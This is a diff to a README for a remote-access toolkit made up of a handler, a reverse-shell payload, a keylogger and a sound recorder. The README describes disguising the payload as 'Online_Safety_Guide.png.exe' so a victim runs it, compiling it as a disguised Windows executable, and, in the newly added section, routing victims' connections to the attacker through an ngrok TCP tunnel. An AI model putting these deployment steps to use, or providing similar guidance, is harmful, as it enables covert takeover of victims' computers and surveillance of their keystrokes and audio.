@@ -1,21 +1,17 @@
 ================================================================================================================================================
 
-# COMMAND AND CONTROL CENTER - REVERSE_SHELL AND HANDLER #
-#========================================================#
+# REVERSE_SHELL AND HANDLER #
+#============================
 
-# 1) server.py HANDLES THE CONTROLS OF THE PAYLOAD
+# 1) handler.py HANDLES THE CONTROLS OF THE PAYLOAD
 # 2) CORRESPONDING reverse_shell.py SCRIPT
 # 3) DEPENDEDNT AND INCLUDED SCRIPTS - keyLogger.py ; soundRecorder.py
 
 # THIS SET OF SCRIPTS, THE HANDLER (handler) ALONG WITH ITS REVERSE_SHELL (AND OTHER DEPENDENT SCRIPTS)
-# ALLOWS REMOTE CONNECTIONS TO MULTIPLE TARGET MACHINES AND GAIN THEIR REMOTE ACCESS
-# BY MANAGING ALL THE CONNECTIONS THROUGH SESSIONS OR BY SENDING SOME COMMANDS TO ALL CONNECTED TARGETS AT ONCE
-# THE SET OF SCRIPTS TRIES TO CLOSELY IMITATE THE METASPLOT METERPRETER 
+# ALLOWS A BASIC REMOTE CONNECTION TO A TARGET MACHINE
 
 # handler.py IS THE CONTROLLER (TO BE DEPLOYED ON THE ATTACKER MACHINE)
 # reverse_shell.py - "Online_Safety_Guide.png.exe" IS THE PAYLOAD (TO BE INJECTED INTO THE VICTIM AND NEEDS TO BE RUN BY THE USER)
-
-# FOR MORE DETAILED USAGE INFO, SEE ALL README(s) OF THE Reverse_Shell DIRECTORY
 
 ================================================================================================================================================
 
@@ -79,8 +75,8 @@
 # AND THE REQUIREMENTS ARE MET IN WINE, THE ATTACKER CAN COMPILE 
 # A PAYLOAD TO BE DEPLOYED AS A DISGUISED WINDOWS EXECUTABLE
 # [SEE README_AUTOMATIC.txt] IN "USAGE_GUIDES" DIRECTORY
-________________________________________________________________________________________________________________________________________________
-------------------------------------------------------------------------------------------------------------------------------------------------
+_____________________________________________________________________________________________________________________________________________________
+-----------------------------------------------------------------------------------------------------------------------------------------------------
 
 # TO RUN THE SCRIPT OVER THE INTERNET [OUTSIDE LOCAL AREA NETWORK]:-
 --------------------------------------------------------------------
@@ -98,6 +94,27 @@ ________________________________________________________________________________
 [*] INTERNAL PORT = 54321	[MUST BE SAME AS ABOVE]
 [*] IP ADDRESS = LOCAL IP ADDRESS OF THE ATTACKER
 [*] PROTOCOL = TCP/ UDP	[USUALLY THIS IS DEFAULT]
+#
+#
+# ALTERNATIVE (REQUIRES NGROK OR A SIMILAR SERVICE)
+----------------------------------------------------
+#
+# FIRE UP NGROK WITH TCP TUNNEL -> FORWARDING IT TO THE DESIRED ATTACKER'S IP AND PORT
+#
+# EXAMPLE USAGE:-
+------------------
+./ngrok tcp 192.168.0.X:54321
+#
+# THE ABOVE COMMAND WILL ESTABLISH A NGROK TUNNEL, FORWARDING ALL TCP TRAFFIC TO THE ATTACKER MACHINE WITH IP 192.168.0.X ON THE LOCAL NETWORK
+# 
+# NGROK SHOULD KEEP RUNNING DURING THE WHOLE PROCESS
+# THE LINK PROVIDED BY NGROK WOULD BE SOMETHING LIKE :	tcp://something.ngrok.io:XXXXX
+# WHERE XXXXX IS THE PORT NUMBER OF THE NGROK TUNNEL
+#
+# THE CONNECTING IP SHOULD BE GIVEN AS	:	something.ngrok.io
+# THE CONNECTING PORT SHOULD BE SET UP	:	XXXXX
+#
+=====================================================================================================================================================
 #
 # ONCE THE ABOVE STEPS ARE DONE CORRECTLY, THE PAYLOAD CAN STILL BE CREATED USING THE FOLLOWING COMMAND AS ROOT
 # 
